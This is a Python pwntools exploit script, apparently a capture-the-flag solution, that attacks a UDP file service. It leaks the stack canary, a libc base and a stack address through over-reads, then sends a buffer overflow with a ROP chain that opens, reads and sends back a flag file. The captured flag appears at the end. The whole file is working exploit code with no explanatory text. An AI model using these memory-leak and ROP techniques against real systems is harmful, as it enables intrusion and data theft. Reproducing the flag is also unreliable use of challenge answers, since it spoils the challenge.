#!/usr/bin/env python3
from pwn import *
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

AUTH=0x201

lib = ELF('./libc.so.6', checksec=False)

def packet(op, size, buf, magic=b'p00p'):
    return magic + p32(op) + p16(size) + buf
def auth(io):
    io.send(packet(AUTH, 16, b'\x00'))
    io.recvuntil(b'cessfully\n')
    return io.recv(8)
def packet2(pw, size, filename):
    return pw + p32(0) + p16(size) + filename
    

if args.REMOTE:
    p = remote('157.245.147.89', 24167, typ='udp')
else:
    p = remote('localhost', 9981, typ='udp')
pw = auth(p)


p.send(packet2(pw, 0x30b, b'moonlit_embrace\x00'.ljust(0x30b-3, b'a') + b'zzz'))
p.recvuntil(b'zzz')
canary = u64(b'\x00' + p.recv(7))
info("canary " + hex(canary))


p.send(packet2(pw, 0x30a+8*2, b'moonlit_embrace\x00'.ljust(0x30a+8*2-3, b'a') + b'zzz'))
p.recvuntil(b'zzz')
lib.address = u64(p.recv(6) + b'\x00\x00') - 0x94ac3
info("lib " + hex(lib.address))


p.send(packet2(pw, 0x30a+8*4, b'moonlit_embrace\x00'.ljust(0x30a+8*4-3, b'a') + b'zzz'))
p.recvuntil(b'zzz')
stack = u64(p.recv(6) + b'\x00\x00')
info("stack " + hex(stack))

one_gadget = 0xebc88+lib.address
rbp = 0x001bbd80+lib.address
rdx = 0x000796a2+lib.address
rsi = 0x001bb397+lib.address
rbp = 0x001bbd80+lib.address
rdi = 0x001bc0a1+lib.address
rax = 0x00128530+lib.address
ret = 0x001aeb4e+lib.address
rcx_rbx = 0x00108b04+lib.address
syscall = 0x00177ee1+lib.address
xchg_edi_eax = 0x001650de+lib.address
flag = b'/home/user/flag\x00'
flag_ptr = stack + (0x7ffff713ec48+3-0x7ffff713f640)

# ropchain = [
#     rdi, flag_ptr, rsi, 0, lib.sym.open,     
#     xchg_edi_eax, rsi, lib.bss(0x400), rdx, 0x100, rax, 0, syscall, 
#     rdi, 11, rsi, lib.bss(0x400), rdx, 0x100, rcx_rbx, 0, 0, lib.sym.sendto,
# ]
ropchain = [
    rdi, flag_ptr, rsi, 0, rax, 2, syscall,     
    xchg_edi_eax, rsi, lib.bss(0x400), rdx, 0x100, rax, 0, syscall, 
    rdi, 11, rsi, lib.bss(0x400), rdx, 0x100, rcx_rbx, 0, 0, lib.sym.sendto,
]
ropchain = b''.join(map(p64, ropchain))
pl = b'..\x00' + flag 
pl = pl.ljust(0x30a)
pl += p64(canary)
pl += p64(0)
pl += ropchain
p.send(packet2(pw, len(pl), pl))


p.interactive()

# W1{just_some_buffer_overflow_to_start_the_day_5848946350dc32aa41d8bee554d00203}